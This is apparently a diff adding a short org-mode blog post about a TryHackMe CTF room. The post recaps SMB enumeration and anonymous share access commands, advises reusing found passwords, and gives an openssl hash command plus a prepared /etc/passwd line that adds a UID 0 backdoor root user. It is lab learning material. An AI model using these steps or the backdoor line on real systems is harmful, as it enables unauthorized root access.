@@ -1,0 +1,39 @@
+#+STARTUP: showall indent
+#+STARTUP: hidestars
+#+OPTIONS: num:nil toc:nil
+#+BEGIN_EXPORT html
+---
+title:  Still finding some basic blind spots.....
+categories:
+  - blog
+tags:
+    - CTF
+    - SMB
+    - passwd
+---
+#+END_EXPORT
+
+So this weekend a easy room was posted on THM, and the little time I had, I spend on it.
+So basic recap... I do not know basic SMB commands, so here a litte reminder:
+
+Check basic availablity of shared
+
+~enum4linux~
+~smbclient --no-pass -L $IP~
+~smbmap -H $IP~
+
+And finally accessing without any credentials... which was my main issue:
+
+~smbclient -N //$IP/sharename~
+
+Which is not that hard.
+
+Again, reuse your passwords you find.... over and over.
+And finally add youselve as root. this is something everone should know :)
+
+~openssl passwd -1 -salt user passwd~
+
+And a prepared line for me:
+#+begin_src sh :results output
+echo 'robiks:$1$robiks$NNRs0eS8OdY4vaI3GJSQu0:0:0:/root/root:/bin/bash'
+#+end_src
